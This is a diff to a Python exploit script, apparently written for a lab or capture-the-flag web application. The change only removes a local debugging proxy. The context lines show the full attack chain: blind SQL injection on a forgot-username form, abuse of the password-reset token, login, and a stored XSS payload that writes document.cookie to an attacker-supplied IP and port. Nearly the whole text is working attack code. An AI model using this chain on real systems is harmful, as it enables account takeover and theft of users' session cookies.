@@ -11,10 +11,6 @@ parser.add_argument('-i','--ip', help='Attacker IP', required=True)
 parser.add_argument('-pt','--port', help='Attacker port', required=True)
 args = parser.parse_args()
 s = requests.session()
-http_proxy = "http://127.0.0.1:8080"
-proxyDict = {
-            "http" : http_proxy
-        }
 
 def forgot_username_sqli(target, inj_str):
 
@@ -23,7 +19,7 @@ def forgot_username_sqli(target, inj_str):
         url = "http://%s/forgotusername.php" %target
         headers = {"Content-Type": "application/x-www-form-urlencoded"}
         data = "username=%s" %inj_str.replace("[CHAR]", str(j))
-        r = requests.post(url, headers=headers, data=data, proxies=proxyDict)
+        r = requests.post(url, headers=headers, data=data)
         content_length = int(r.headers['Content-Length'])
         if (content_length < 1480):
             return j
@@ -51,7 +47,7 @@ def request_token(target, username):
     url = "http://%s/forgotpassword.php" %target
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
     data = "username=%s" %username
-    r = requests.post(url, headers=headers, data=data, proxies=proxyDict)
+    r = requests.post(url, headers=headers, data=data)
     return
 
 def reset_password(target, token, password):
@@ -59,7 +55,7 @@ def reset_password(target, token, password):
     url = "http://%s/resetpassword.php" %target
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
     data = "token=%s&password1=%s&password2=%s" %(token, password, password)
-    r = requests.post(url, headers=headers, data=data, proxies=proxyDict)
+    r = requests.post(url, headers=headers, data=data)
     if "Password changed!" in r.text:
         print("[+] Password change successful")
     else:
@@ -73,7 +69,7 @@ def login(target, username, password):
     url = "http://%s/login.php" %target
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
     data = {"username":"%s" %username, "password":"%s" %password}
-    r = s.post(url, headers=headers, data=data, proxies=proxyDict, allow_redirects=False)
+    r = s.post(url, headers=headers, data=data, allow_redirects=False)
     if (r.status_code == 302):
         print("[+] Login successful!")
     else:
@@ -87,7 +83,7 @@ def update_description(target, ip, port):
     print("[+] Attempting to update desciption to inject cookie stealing XSS payload...")
     url = "http://%s/profile.php" %target
     data = {"description":"<script>document.write('<img src=http://%s:%s/'+document.cookie+' />');</script>" %(ip, port)}
-    r = s.post(url, data=data, proxies=proxyDict)
+    r = s.post(url, data=data)
     if "Success" in r.text:
         print("[+] Description updated")
     else:
